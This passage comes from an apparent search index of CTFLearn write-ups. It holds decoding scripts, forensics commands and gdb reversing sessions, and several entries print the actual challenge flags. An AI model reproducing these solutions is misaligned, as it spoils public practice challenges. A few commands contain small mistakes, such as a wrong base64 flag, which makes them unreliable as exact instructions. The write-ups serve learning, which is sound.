-&gt; m = k*n + c, where k&gt;=0 is an integer\n</code></pre> <p>Starting from k=0, try to check which m gives a flag-like output. Luckily, here m = c works.</p> <pre><code>echo \"obase=16; ibase=10; 9327565722767258308650643213344542404592011161659991421\" | bc | xxd -r -p\n</code></pre>"},{"location":"CTFLearn/Cryptography/121/","title":"So many 64s","text":"<p>Repeatedly decode (b64) until the string is of small length, say 30 Bash script:</p> <pre><code>if [ $# -eq 0 ]; then\n  echo \"Usage: $0 &lt;input_file&gt;\"\n  exit 1\nfi\n\nif [ ! -f \"$1\" ]; then\n  echo \"Error: File '$1' does not exist.\"\n  exit 2\nfi\n\ninput_text=$(cat \"$1\")\n\nwhile [ ${#input_text} -gt 30 ]; do\n  input_text=$(echo \"$input_text\" | base64 -d)\n\n  if [ $? -ne 0 ]; then\n    echo \"$input_text\"\n    exit 3\n  fi\ndone\n</code></pre>"},{"location":"CTFLearn/Cryptography/158/","title":"Hextroadinary","text":"<p>Take XOR of the given numbers:</p> <pre><code>python3 -c 'print(hex(0xc4115 ^ 0x4cf8))'\n</code></pre>"},{"location":"CTFLearn/Cryptography/192/","title":"Base 2 2 the 6","text":"<p>Decode the given string:</p> <pre><code>echo \"&lt;given-string&gt;\" | base64 --decode\n</code></pre>"},{"location":"CTFLearn/Cryptography/227/","title":"BruXOR","text":"<p>Brute force every ASCII key:</p> <pre><code>text = \"q{vpln'bH_varHuebcrqxetrHOXEj\"\nfor key in range(256):\n    print(''.join([chr(key ^ ord(x)) for x in text]))\n</code></pre>"},{"location":"CTFLearn/Cryptography/230/","title":"Reverse Polarity","text":"<p>Convert the given string from Binary to Hex to ASCII:</p> <pre><code>echo \"obase=16; ibase=2; &lt;given-string&gt;\" | bc | xxd -r -p\n</code></pre>"},{"location":"CTFLearn/Cryptography/238/","title":"Substitution Cipher","text":"<p>Python script:</p> <pre><code># Mapping defined by pure observation, intuition, manual substitution and repeated runs of code\nREVERSE_CIPHER_ALPHABET = {\n    'M': 'T', 'I': 'H', 'T': 'E', 'L': 'S', 'O': 'I', 'F': 'N', 'S':'L', 'B':'Y', 'K': 'R', 'W': 'U', 'Z': 'B', 'R':'D', 'E':'C', 'D': 'M', 'X': 'V', 'G':'O', 'C': 'W', 'U':'G', 'Q':'K','Y':'F', 'H':'P'\n}\n\ndef decode_substitution_cipher(cipher_text):\n    decoded_message = ''.join(\n        REVERSE_CIPHER_ALPHABET.get(char, char) for char in cipher_text.upper()\n    )\n    return decoded_message\n\ndef read_cipher_text(file_path):\n    try:\n        with open(file_path, 'r', encoding='utf-8') as file:\n            return file.read()\n    except FileNotFoundError:\n        print(f\"Error: File '{file_path}' not found.\")\n        return \"\"\n\nif __name__ == \"__main__\":\n    file_path = \"Substitution.txt\"\n    cipher_text = read_cipher_text(file_path)\n\n    if cipher_text:\n        decoded_message = decode_substitution_cipher(cipher_text)\n        print(\"Decoded Message:\")\n        print(decoded_message)\n</code></pre>"},{"location":"CTFLearn/Cryptography/263/","title":"5x5 Crypto","text":"<p>Python script:</p> <pre><code>grid5x5 = [\n    ['a','b','c','d','e'],\n    ['f','g','h','i','j'],\n    ['l','m','n','o','p'],\n    ['q','r','s','t','u'],\n    ['v','w','x','y','z']\n]\n\ntext=\"1-3,4-4,2-1,{,4-4,2-3,4-5,3-2,1-2,4-3,_,4-5,3-5,}\"\ntext = text.split(',')\nfor t in text:\n    if '-' in t:\n        x,y = t.split('-')\n        print(grid5x5[int(x)-1][int(y)-1],end='')\n    else:\n        print(t,end='')\n</code></pre>"},{"location":"CTFLearn/Cryptography/305/","title":"Vigenere Cipher","text":"<ol> <li>Get <code>cipher-text</code> and <code>keyword</code> from the problem statement.</li> <li>Decipher using Python script: <code>python3 script.py &lt;cipher-text&gt; &lt;keyword&gt;</code></li> </ol>"},{"location":"CTFLearn/Cryptography/309/","title":"Morse Code","text":"<p>Python Script:</p> <pre><code>MORSE_CODE_DICT = {\n    'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.',\n    'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',\n    'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---',\n    'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',\n    'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--',\n    'Z': '--..', '1': '.----', '2': '..---', '3': '...--', '4': '....-', \n    '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.', \n    '0': '-----', ',': '--..--', '.': '.-.-.-', '?': '..--..', \"'\": '.----.', \n    '!': '-.-.--', '/': '-..-.', '(': '-.--.', ')': '-.--.-', '&amp;': '.-...',\n    ':': '---...', ';': '-.-.-.', '=': '-...-', '+': '.-.-.', '-': '-....-', \n    '_': '..--.-', '\"': '.-..-.', '$': '...-..-', '@': '.--.-.', ' ': '/'\n}\n\nMORSE_TO_TEXT = {value: key for key, value in MORSE_CODE_DICT.items()}\n\ndef decode_morse(morse_code):\n    letters = morse_code.split(' ')\n    decoded_word = ''.join(MORSE_TO_TEXT.get(letter, '') for letter in letters)\n    return decoded_word    \n\nflag = decode_morse(morse_input)\nprint(flag)\n</code></pre>"},{"location":"CTFLearn/Cryptography/443/","title":"HyperStream Test #2","text":"<p>Use Bacon Cipher (original 24-letter variant):</p> <pre><code>BACON_CIPHER_DICT = {\n    'AAAAA': 'A', 'AAAAB': 'B', 'AAABA': 'C', 'AAABB': 'D', 'AABAA': 'E',\n    'AABAB': 'F', 'AABBA': 'G', 'AABBB': 'H', 'ABAAA': 'I', 'ABAAB': 'K',\n    'ABABA': 'L', 'ABABB': 'M', 'ABBAA': 'N', 'ABBAB': 'O', 'ABBBA': 'P',\n    'ABBBB': 'Q', 'BAAAA': 'R', 'BAAAB': 'S', 'BAABA': 'T', 'BAABB': 'U',\n    'BABAA': 'W', 'BABAB': 'X', 'BABBA': 'Y', 'BABBB': 'Z'\n}\n\ndef decode_bacon(bacon_input):\n    bacon_groups = [bacon_input[i:i+5] for i in range(0, len(bacon_input), 5)]\n    decoded_message = ''.join(BACON_CIPHER_DICT.get(group, '') for group in bacon_groups)\n    return decoded_message\n\ndecoded_flag = decode_bacon(bacon_input)\nprint(decoded_flag.lower())\n</code></pre>"},{"location":"CTFLearn/Cryptography/887/","title":"Suspecious message","text":"<p>Playfair Cipher</p> <p>Python script:</p> <pre><code>PLAYFAIR_CIPHER_GRID =[\n    'Q', 'W', 'E', 'R', 'T',\n    'Y', 'U', 'I', 'O', 'P',\n    'A', 'S', 'D', 'F', 'G',\n    'H', 'K', 'L', 'Z', 'X',\n    'C', 'V', 'B', 'N', 'M'\n]\n\nciphertext=\"MQDzqdor{Ix4Oa41W_1F_B00h_m1YlqPpPP}\"\n\ndef find_next_alpha(p):\n    while p &lt; len(ciphertext) and not ciphertext[p].isalpha():\n        p+=1\n    return p\n\ni = 0\nwhile True:\n    start = i\n    i = find_next_alpha(i)\n    j = find_next_alpha(i+1)\n    if i &gt;= len(ciphertext) or j &gt;= len(ciphertext):\n        for k in range(start,len(ciphertext)):\n            print(ciphertext[k], end=\"\")\n        break\n\n    x,y = ciphertext[i], ciphertext[j]\n    posx, posy = PLAYFAIR_CIPHER_GRID.index(x.upper()), PLAYFAIR_CIPHER_GRID.index(y.upper())\n    rowx, colx = divmod(posx, 5)\n    rowy, coly = divmod(posy, 5)\n\n    pr=[]\n    if rowx == rowy and colx == coly:\n        pr = [PLAYFAIR_CIPHER_GRID[(rowx+4)%5*5+(colx+4)%5], PLAYFAIR_CIPHER_GRID[(rowy+4)%5*5+(coly+4)%5]]\n    elif colx == coly:\n        pr = [PLAYFAIR_CIPHER_GRID[(rowx+4)%5*5+colx], PLAYFAIR_CIPHER_GRID[(rowy+4)%5*5+coly]]\n    elif rowx == rowy:\n        pr = [PLAYFAIR_CIPHER_GRID[rowx*5+(colx+4)%5], PLAYFAIR_CIPHER_GRID[rowy*5+(coly+4)%5]]\n    else:\n        pr = [PLAYFAIR_CIPHER_GRID[rowx*5+coly], PLAYFAIR_CIPHER_GRID[rowy*5+colx]]\n\n    if x.islower():\n        pr[0] = pr[0].lower()\n    if y.islower():\n        pr[1] = pr[1].lower()\n\n    for k in range(start,i):\n        print(ciphertext[k], end=\"\")\n    print(pr[0], end=\"\")\n    for k in range(i+1,j):\n        print(ciphertext[k], end=\"\")\n    print(pr[1], end=\"\")\n\n    i = j+1\n</code></pre>"},{"location":"CTFLearn/Forensics/103/","title":"Taking LS","text":"<p>Get the Password for PDF, opening which shows the Flag:</p> <pre><code>unzip The\\ Flag.zip\ncd The\\ Flag/\nls -a\ncd .ThePassword/\nls\ncat ThePassword.txt\n</code></pre>"},{"location":"CTFLearn/Forensics/104/","title":"Git Is Good","text":"<pre><code>unzip gitIsGood.zip\ncd gitIsGood/\ngit log\n</code></pre> <p>Go to the previous commit <code>git checkout &lt;commit-hash&gt;</code> and look at <code>flag.txt</code></p>"},{"location":"CTFLearn/Forensics/108/","title":"Binwalk","text":"<p>IGNORE the zlib file :)</p> <pre><code>binwalk -e --dd=\".*\" PurpleThing.jpeg\ncd _PurpleThing.jpeg.extracted/\nopen 25795\n</code></pre>"},{"location":"CTFLearn/Forensics/138/","title":"Corrupted File","text":"<ol> <li> <p>As the problem states, the solution lies in the header of the given file:</p> <p><code>bash head unopenable.gif | xxd</code></p> </li> <li> <p>Some googling told that GIF files start with <code>GIF87a</code> or <code>GIF89a</code>, but the given file's header begins with <code>9a</code>. Edit the header accordingly, Voila!, now the GIF is openable.</p> </li> <li>Use some online tool to get the frames of the GIF, which give us the encoded flag.</li> <li> <p>Decode the flag:</p> <p><code>bash echo \"&lt;encoded-flag&gt;\" | base64 -d</code></p> </li> </ol>"},{"location":"CTFLearn/Forensics/142/","title":"Up For A Little Challenge?","text":"<p>Get mega.nz link (for another zip file) and real_unlock_key (for a hidden cerb4 file within): <code>strings Begin\\ Hack.jpg</code> \\ Further steps:</p> <pre><code>unzip Up\\ For\\ A\\ Little\\ Challenge.zip\ncd Did\\ I\\ Forget\\ Again\\?/\nls -a\nunzip .Processing.cerb4\nopen skycoder.jpg\n</code></pre>"},{"location":"CTFLearn/Forensics/195/","title":"Milk's Best Friend","text":"<p>prereq: <code>unrar</code> is installed.</p> <pre><code>binwalk -e oreo.jpg\ncd _oreo.jpg.extracted/\nstrings b.jpg\n</code></pre>"},{"location":"CTFLearn/Forensics/237/","title":"Digital Camouflage","text":"<ol> <li>Given is a network capture file whose contents can be read using <code>tshark</code>. From Hint 1,</li> </ol> <p><code>bash    tshark -r data.pcap -Y \"http.request.method == POST\" -Tfields -e text</code></p> <ol> <li>We get login credentials which contain an encoded password:</li> </ol> <p><code>bash    echo \"&lt;pswrd&gt;\" | base64 -d</code></p>"},{"location":"CTFLearn/Forensics/303/","title":"Exif","text":"<pre><code>exiftool &lt;image.jpg&gt;\n</code></pre>"},{"location":"CTFLearn/Forensics/348/","title":"WOW.... So Meta","text":"<pre><code>exiftool &lt;image.jpg&gt;\n</code></pre>"},{"location":"CTFLearn/Forensics/356/","title":"A CAPture of a Flag","text":"<ol> <li> <p>Given is a network capture file whose contents can be read using <code>tcpdump</code> or <code>tshark</code>:</p> <p><code>bash tshark -r flag\\ \\(4\\)</code></p> <p><code>bash tcpdump -r flag\\ \\(4\\)</code></p> </li> <li> <p>Observing the output, we encounter a GET request:</p> <ul> <li>tshark output: <code>247   2.270670 10.50.203.75 \u2192 185.21.216.190 HTTP 504 GET /?msg=ZmxhZ3tBRmxhZ0luUENBUH0= HTTP/1.1</code></li> <li>tcpdump output: <code>19:33:25.963056 IP 10.50.203.75.23253 &gt; thisis.feralhosting.com.http: Flags [P.], seq 1:451, ack 1, win 64, length 450: HTTP: GET /?msg=ZmxhZ3tBRmxhZ0luUENBUH0= HTTP/1.1</code></li> </ul> </li> <li> <p>Decode the msg: <code>echo \"&lt;msg&gt;\" | base64 -d</code></p> </li> </ol>"},{"location":"CTFLearn/Forensics/883/","title":"I'm a dump","text":"<p>Get line number: <code>xxd file | grep \"CTF\" -n | grep -o '^[0-9]*'</code> --&gt; 278 \\ Output 3 lines from that lineno: <code>xxd file | gawk '{print $10}' | sed -n \"278,280p\"</code></p>"},{"location":"CTFLearn/Forensics/894/","title":"Simple Steganography","text":"<p>Get passphrase in metadata: <code>exiftool -Keywords Minions1.jpeg</code> \\ Further steps:</p> <pre><code>steghide extract -sf Minions1.jpeg\nbase64 -d raw.txt\n</code></pre>"},{"location":"CTFLearn/Forensics/933/","title":"Rubber Duck","text":"<pre><code>exiftool &lt;image.jpg&gt;\n</code></pre>"},{"location":"CTFLearn/Forensics/934/","title":"Snowboard","text":"<p>Get base64-encoded string (ignore the decoy flag): <code>strings Snowboard.jpg | head -n 5</code> \\ Decode: <code>echo \"&lt;string&gt;\" | base64 --decode</code></p>"},{"location":"CTFLearn/Forensics/935/","title":"PikesPeak","text":"<p>Analyse the strings of the image: <code>strings PikesPeak.jpg | head -n 12</code> \\ Extract the correct one among the displayed flags: <code>strings PikesPeak.jpg | grep \"CTFlearn\"</code></p>"},{"location":"CTFLearn/Forensics/955/","title":"Minions","text":"<ol> <li>Get another mega.nz link: <code>strings Hey_You.png | grep \"mega\"</code></li> <li> <p>Get encoded flag:</p> <p><code>bash binwalk -e Only_Few_Steps.jpg cd _Only_Few_Steps.jpg.extracted/ strings YouWon\\(Almost\\).jpg | grep -i \"ctf\"</code></p> </li> <li> <p>Decode (b64) 4 times: <code>echo \"&lt;encoded-flag&gt;\" | base64 -d | base64 -d | base64 -d | base64 -d</code></p> </li> </ol>"},{"location":"CTFLearn/Forensics/957/","title":"PDF by fdpumyp","text":"<ol> <li>Get <code>external</code> : <code>strings dontopen.pdf</code> \\</li> <li>Decode (b64): <code>echo \"&lt;external&gt;\" | base64 -d</code></li> </ol>"},{"location":"CTFLearn/Forensics/959/","title":"Blank Page","text":"<ol> <li> <p>There are two kinds of whitespace in the text file (<code>sed 's/\\(.\\)/\\1\\n/g' TheMessage.txt | sort | uniq -c</code>), transform one into 0 and other into 1:</p> <p><code>python with open(\"TheMessage.txt\", 'r', encoding='utf-8') as file:     content = file.read()     space1, space2 = set(content)     print(content.replace(space1, '0').replace(space2, '1'))</code></p> </li> <li> <p>Transform the binary into ASCII:</p> <p><code>bash echo \"obase=16; ibase=2; &lt;binary-string&gt; | bc | xxd -r -p\"</code></p> </li> </ol>"},{"location":"CTFLearn/Forensics/96/","title":"Forensics 101","text":"<pre><code>strings &lt;image.jpg&gt;\n</code></pre>"},{"location":"CTFLearn/Forensics/97/","title":"07601","text":"<pre><code>binwalk -e AGT.png\ncd _AGT.png.extracted/\ncd Secret\\ Stuff.../\ncd Don\\'t\\ Open\\ This.../\nstrings I\\ Warned\\ You.jpeg | grep \"CTF\"\n</code></pre>"},{"location":"CTFLearn/Forensics/971/","title":"Pho is Tasty!","text":"<p>Dump the file in hexadecimal format; remove all '.' from the output; only print the last column (relevant); print first 10 lines:\\ <code>xxd Pho.jpg | tr -d \".\" | gawk '{print $10}' | head</code></p>"},{"location":"CTFLearn/Forensics/972/","title":"Chalkboard","text":"<p>Get equations and flag format from metadata of the image: <code>exiftool math.jpg</code> \\ Solve for x and y</p>"},{"location":"CTFLearn/Forensics/973/","title":"Tux!","text":"<p>Get encoded string from Comment in metadata: <code>exiftool -Comment Tux.jpg</code> \\ Get password for zip file: <code>echo \"&lt;encoded-string&gt;\" | base64 --decode\"</code> Further steps:</p> <pre><code>binwalk -e Tux.jpg\ncd _Tux.jpg.extracted/\nunzip 1570.zip\ncat flag\n</code></pre>"},{"location":"CTFLearn/Miscellaneous/107/","title":"Where Can My Robot Go?","text":"<ol> <li>The statement of the challenge clearly suggests checking out the robots.txt file of CTFLEARN here</li> <li>The hint suggests checking out the HTML page mentioned in the <code>Disallow</code> field in <code>robots.txt</code></li> </ol>"},{"location":"CTFLearn/Miscellaneous/1072/","title":"Time Traveller","text":"<p>Wayback Machine</p>"},{"location":"CTFLearn/Miscellaneous/168/","title":"Wikipedia","text":"<ol> <li>Go to Wikipedia and search the IP address given. Result</li> <li>Go to the page (the one and only search result) and search for \"CTF\".</li> </ol>"},{"location":"CTFLearn/Miscellaneous/228/","title":"QR Code","text":"<ol> <li>Scan the QR Code to get <code>encoded-qr-text</code></li> <li>Decode it (b64): <code>echo \"&lt;text&gt;\" | base64 --encode</code></li> <li>ROT13 using Python script: <code>python3 script.py &lt;decoded-text&gt; 13</code></li> </ol>"},{"location":"CTFLearn/Miscellaneous/855/","title":"Rock Paper Scissors","text":"<p>The server plays the same moves everytime it's started, so the first 10 moves to win are:</p> <ol> <li>P</li> <li>R</li> <li>P</li> <li>S</li> <li>P</li> <li>P</li> <li>S</li> <li>P</li> <li>R</li> <li>P</li> </ol>"},{"location":"CTFLearn/Programming/1026/","title":"Adoni Assembler Chall","text":"<p>Remove lines 20-28 in <code>adoni.asm</code> and run as follows:</p> <pre><code>nasm -f elf64 adoni.asm\nld -o adoni adoni.o\n./adoni\n</code></pre>"},{"location":"CTFLearn/Programming/1030/","title":"AndhraPradesh Assembler Chall","text":"<p>Remove lines 20-28 in <code>adoni.asm</code> and run as follows:</p> <pre><code>;   ###################################################################\n;   Change the values of these five constants to solve the challenge\n    con1 db 0xab  ; C syntax for hex constant\n    con2 db 0x00  ;\n    con3 db 0x20\n    con4 db 0adh    ; this form for hex constants is popular among assembly language programmers\n    con5 db 0bah\n;   ####################################################################\n</code></pre>"},{"location":"CTFLearn/Programming/1050/","title":"Programming a language","text":"<p>Python script:</p> <pre><code>with open(\"input.txt\",\"r\") as file:\n    input = file.read()\n    # print(input)\n\n    st=[0]\n    for c in input:\n        match c:\n            case \"-\":\n                st[-1]-=1\n            case \"+\":\n                st[-1]+=1\n            case \"&gt;\":\n                st = st[1:len(st)] + st[0:1]\n            case \"&lt;\":\n                st = st[-1:len(st)]+st[0:-1]\n            case \"@\":\n                st[-1],st[-2] = st[-2],st[-1]\n            case \".\":\n                st.append(st[-1])\n\n    print(''.join([chr(num) for num in st]))\n</code></pre>"},{"location":"CTFLearn/Programming/1133/","title":"An Old Image","text":"<p>Python script:</p> <pre><code>import cv2 as cv\nimport pandas as pd\nimport itertools\nimport numpy as np\n\nimgfile = \"old_image.png\"\nimage = cv.imread(imgfile)\n\n# Convert the image from BGR (OpenCV's default) to RGB\nimage = cv.cvtColor(image, cv.COLOR_BGR2RGB)\n\nheight, width, _ = image.shape\npixel_data = []\n\nfor y in range(height):\n    for x in range(width):\n        r, g, b = image[y, x]\n        pixel_data.append((x, y, r, g, b))\n\ndf = pd.DataFrame(pixel_data, columns=[\"x\", \"y\", \"red\", \"green\", \"blue\"])\n# print(df)\ncolumns_to_mix = [\"x\", \"y\", \"red\", \"green\"]\n\n# Generate all permutations\npermutations = list(itertools.permutations(columns_to_mix))\nprint(permutations)\nimages = []\n\nfor perm in permutations:\n    permuted_df = df[list(perm) + [\"blue\"]]\n    permuted_df.columns = [\"x\", \"y\", \"red\", \"green\", \"blue\"]\n    print(permuted_df)\n\n    # Reconstruct the image\n    permuted_image = np.zeros((height, width, 3), dtype=np.uint8)\n    for _, row in permuted_df.iterrows():\n        x, y, r, g, b = int(row[\"x\"]), int(row[\"y\"]), int(row[\"red\"]), int(row[\"green\"]), int(row[\"blue\"])\n        permuted_image[y, x] = [r, g, b]\n\n    images.append(permuted_image)    \n\n# Navigation loop to display images\ncurrent_index = 0\nthreshold = 90 # Tweak this if QR code is not detected\nwhile True:\n    # Convert the image to black and white\n    gray_image = cv.cvtColor(images[current_index], cv.COLOR_RGB2GRAY)\n    _, binary_image = cv.threshold(gray_image, threshold, 255, cv.THRESH_BINARY)\n\n    cv.imshow(\"Permuted Image - B/W\", binary_image)\n    print(f\"Showing image {current_index + 1} of {len(images)}\")\n\n    key = cv.waitKey(0) &amp; 0xFF\n\n    if key == 27:  # ESC key to exit\n        break\n    elif key == 81:  # Left arrow key\n        current_index = (current_index - 1) % len(images)\n    elif key == 83:  # Right arrow key\n        current_index = (current_index + 1) % len(images)\n\ncv.destroyAllWindows()\n</code></pre>"},{"location":"CTFLearn/Programming/174/","title":"Simple Programming","text":"<p>AWK script:</p> <pre><code>BEGIN {\n    linenum = 0\n}\n{\n    ct0 = gsub(/0/, \"\", $0)\n    ct1 = gsub(/1/, \"\", $0)\n\n    if (ct0%3 == 0 || ct1%2 == 0) {\n        linenum++\n    }\n}\nEND {\n    print linenum\n}\n</code></pre> <pre><code>gawk -f script.awk data.dat\n</code></pre>"},{"location":"CTFLearn/Programming/434/","title":"Dawn's Lawn","text":"<p>Go script:</p> <pre><code>package main\n\nimport (\n    \"bufio\"\n    \"os\"\n)\n\n\nfunc main(){\n    file, _ := os.Open(\"dawn2.txt\")\n    scanner := bufio.NewScanner(file)\n\n    mp := map[rune]int{\n        '.':  0,\n        '_':  1,\n        '\\\\': 2,\n        '-':  3,\n        '/':  4,\n        '|':  5,\n        '*':  6,\n    }\n\n    var side int\n    ct := 0\n    for scanner.Scan(){\n        line := scanner.Text()\n        // println(line)\n        side = len(line)\n        for i, c := range line{\n            if state, ok := mp[c]; ok{\n                // print(state)\n                state -= 2\n                if state&gt;0{\n                    // print(state+side-i-1, \" \")\n                    ct += map[bool]int{true: 1, false: 0}[state+side-i-1 &gt;= 6]\n                }\n            }else{\n                print(\" \")\n            }\n        }\n        // println()\n    }\n    // println(side)\n    println(ct)\n}\n</code></pre>"},{"location":"CTFLearn/Programming/449/","title":"Python Reversal","text":"<p>Python script:</p> <pre><code>import base64\n\ndef demikeSwift(s1):\n    l = s1.split(\"h4ck\")\n    # print(l, len(l))\n    s2 = \"\".join([x[1] for x in l if len(x) &gt; 1])\n    s2 = \"8\"+s2[1::]\n    # print(s2)\n    return s2\n\ndef decrypt(s2):\n    s3 = s2[3::]\n    # print(s3)\n    last = 0\n    s=\"\"\n    for i in range(82,-1,-1):\n        temp = s3[last:last+len(str(i))+1]\n        last += len(str(i))+1\n        s += temp[0]\n    # print(s)\n    s3 = s[::-1]\n    # print(s3)\n    return s3\n\ndef deobfuscate(s3):\n    s4 = s3[len(\"florSFIUEfet4565477\")::]\n    s4 = s4.split(\"=\")[0]+\"=\"\n    # print(s4)\n    s4 = bytes(s4, 'utf-8')\n    s4 = base64.b64decode(s4)\n    # print(s4)\n    return s4\n\nflag = \"81h4ck891h4ck931h4ck3l1h4ckl81h4ck821h4ck2j1h4ckj81h4ck811h4ck1y1h4cky81h4ck801h4ck061h4ck671h4ck791h4ck951h4ck571h4ck781h4ck8y1h4cky71h4ck771h4ck761h4ck671h4ck761h4ck6y1h4cky71h4ck751h4ck5t1h4ckt71h4ck741h4ck4h1h4ckh71h4ck731h4ck3d1h4ckd71h4ck721h4ck2f1h4ckf71h4ck711h4ck1g1h4ckg71h4ck701h4ck0f1h4ckf61h4ck691h4ck9g1h4ckg61h4ck681h4ck8f1h4ckf61h4ck671h4ck7d1h4ckd61h4ck661h4ck6f1h4ckf61h4ck651h4ck551h4ck561h4ck641h4ck441h4ck461h4ck631h4ck331h4ck361h4ck621h4ck241h4ck461h4ck611h4ck131h4ck361h4ck601h4ck051h4ck551h4ck591h4ck9=1h4ck=51h4ck581h4ck801h4ck051h4ck571h4ck7n1h4ckn51h4ck561h4ck6R1h4ckR51h4ck551h4ck5s1h4cks51h4ck541h4ck4R1h4ckR51h4ck531h4ck3z1h4ckz51h4ck521h4ck2Z1h4ckZ51h4ck511h4ck1f1h4ckf51h4ck501h4ck0V1h4ckV41h4ck491h4ck9T1h4ckT41h4ck481h4ck8M1h4ckM41h4ck471h4ck7f1h4ckf41h4ck461h4ck6N1h4ckN41h4ck451h4ck5H1h4ckH41h4ck441h4ck4Z1h4ckZ41h4ck431h4ck3y1h4cky41h4ck421h4ck2R1h4ckR41h4ck411h4ck1z1h4ckz41h4ck401h4ck0d1h4ckd31h4ck391h4ck9r1h4ckr31h4ck381h4ck8N1h4ckN31h4ck371h4ck7G1h4ckG31h4ck361h4ck6N1h4ckN31h4ck351h4ck5i1h4cki31h4ck341h4ck491h4ck931h4ck331h4ck311h4ck131h4ck321h4ck2Z1h4ckZ31h4ck311h4ck101h4ck031h4ck301h4ck0w1h4ckw21h4ck291h4ck9m1h4ckm21h4ck281h4ck8R1h4ckR21h4ck271h4ck771h4ck721h4ck261h4ck6J1h4ckJ21h4ck251h4ck5X1h4ckX21h4ck241h4ck4Z1h4ckZ21h4ck231h4ck3i1h4cki21h4ck221h4ck2l1h4ckl21h4ck211h4ck131h4ck321h4ck201h4ck0Y1h4ckY11h4ck191h4ck971h4ck711h4ck181h4ck871h4ck711h4ck171h4ck741h4ck411h4ck161h4ck651h4ck511h4ck151h4ck561h4ck611h4ck141h4ck451h4ck511h4ck131h4ck341h4ck411h4ck121h4ck2t1h4ckt11h4ck111h4ck1e1h4cke11h4ck101h4ck0f1h4ckf91h4ck9E1h4ckE81h4ck8U1h4ckU71h4ck7I1h4ckI61h4ck6F1h4ckF51h4ck5S1h4ckS41h4ck4r1h4ckr31h4ck3o1h4cko21h4ck2l1h4ckl11h4ck1f1h4ckf01h4ck0\"\nflag = demikeSwift(flag)\nflag = decrypt(flag)\nflag = deobfuscate(flag)\nprint(flag)\n</code></pre>"},{"location":"CTFLearn/Programming/89/","title":"Image Magic","text":"<p>Python script:</p> <pre><code>from PIL import Image\n\nimgfile = \"out copy.jpg\"\nimg = Image.open(imgfile)\n\nw = 304\nh = img.width // w\n\nnew_img = Image.new(img.mode, (w, h))\n\nfor i in range(img.width):\n    col = i // h\n    row = i % h\n    pixel = img.getpixel((i, 0))\n    new_img.putpixel((col, row), pixel)\n\nnew_img.show()    \n</code></pre>"},{"location":"CTFLearn/Programming/970/","title":"The Credit Card Fraudster","text":"<p>Python script:</p> <pre><code>cardno=\"543210******1234\"\nposs=[]\n\nfor temp in range(10**6):\n    s = str(temp).zfill(6)\n    num = cardno[0:6]+s+cardno[12:16]\n\n    if int(num) % 123457 == 0:\n        poss.append(num)\n\n# print(poss)\n\nweights = [2 if i%2==0 else 1 for i in range(16)]\n# print(weights)\n\ndef sum_of_digits(n):\n    return sum(int(digit) for digit in str(n))\n\nfor num in poss:\n    numl = list(num)\n    luhn = [sum_of_digits(int(num[i])*weights[i]) for i in range(16)]\n    # print(sum(luhn))\n    if(sum(luhn)%10==0):\n        print(num)\n</code></pre>"},{"location":"CTFLearn/Reversing/188/","title":"RE_verseDIS","text":"<ol> <li>Try <code>strings</code> command, doesn't help much.</li> <li>Start gdb, <code>break</code> at main, <code>run</code> with some random flag, and <code>disas</code> main</li> <li>Notice various comments with addresses, printing some of them using <code>x/s</code> gives some of the strings that <code>strings</code> gave, while some of them are blank which may fill up during execution</li> <li>Break at the end and print the strings again</li> </ol> <p>```gdb    (gdb) break *main+286    Breakpoint 2 at 0x55555540085e    (gdb) c    Continuing.    Input password: sdfghjkl    Wrong password</p> <p>Breakpoint 2, 0x000055555540085e in main ()    (gdb) x/s 0x555555601140    0x555555601140 :   \"AbCTF{r3vers1ng_dud3}\"    ```"},{"location":"CTFLearn/Reversing/379/","title":"PIN","text":"<ol> <li>Running the executable file tells us that it requires a PIN as input, which will then be compared with the correct PIN in the program. PIN is the flag.</li> <li> <p>Start gdb, set a breakpoint and disas main():</p> <p><code>bash gdb ./rev1</code></p> <p>```gdb (gdb) break main Breakpoint 1 at 0x4005da (gdb) r Starting program: /home/harshit/Downloads/rev1  [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".</p> <p>Breakpoint 1, 0x00000000004005da in main () (gdb) disas main Dump of assembler code for function main:     0x00000000004005d6 &lt;+0&gt;:    push   %rbp     0x00000000004005d7 &lt;+1&gt;:    mov    %rsp,%rbp =&gt;  0x00000000004005da &lt;+4&gt;:    sub    $0x10,%rsp     0x00000000004005de &lt;+8&gt;:    lea    0xdf(%rip),%rdi        # 0x4006c4     0x00000000004005e5 &lt;+15&gt;:   mov    $0x0,%eax     0x00000000004005ea &lt;+20&gt;:   call   0x4004a0 printf@plt     0x00000000004005ef &lt;+25&gt;:   lea    -0x4(%rbp),%rax     0x00000000004005f3 &lt;+29&gt;:   mov    %rax,%rsi     0x00000000004005f6 &lt;+32&gt;:   lea    0xd6(%rip),%rdi        # 0x4006d3     0x00000000004005fd &lt;+39&gt;:   mov    $0x0,%eax     0x0000000000400602 &lt;+44&gt;:   call   0x4004b0 __isoc99_scanf@plt     0x0000000000400607 &lt;+49&gt;:   mov    -0x4(%rbp),%eax     0x000000000040060a &lt;+52&gt;:   mov    %eax,%edi     0x000000000040060c &lt;+54&gt;:   call   0x4005b6      0x0000000000400611 &lt;+59&gt;:   test   %eax,%eax     0x0000000000400613 &lt;+61&gt;:   je     0x400623      0x0000000000400615 &lt;+63&gt;:   lea    0xba(%rip),%rdi        # 0x4006d6     0x000000000040061c &lt;+70&gt;:   call   0x400490 puts@plt     0x0000000000400621 &lt;+75&gt;:   jmp    0x40062f      0x0000000000400623 &lt;+77&gt;:   lea    0xba(%rip),%rdi        # 0x4006e4     0x000000000040062a &lt;+84&gt;:   call   0x400490 puts@plt     0x000000000040062f &lt;+89&gt;:   mov    $0x0,%eax     0x0000000000400634 &lt;+94&gt;:   leave     0x0000000000400635 &lt;+95&gt;:   ret End of assembler dump. <p>```</p> <p>The code looks like it calls a function <code>cek()</code>, depending on whose return value (zero or non-zero), different <code>puts</code> are encountered.</p> <li> <p>Disassemble cek():</p> <p><code>gdb (gdb) disas cek Dump of assembler code for function cek: 0x00000000004005b6 &lt;+0&gt;:    push   %rbp 0x00000000004005b7 &lt;+1&gt;:    mov    %rsp,%rbp 0x00000000004005ba &lt;+4&gt;:    mov    %edi,-0x4(%rbp) 0x00000000004005bd 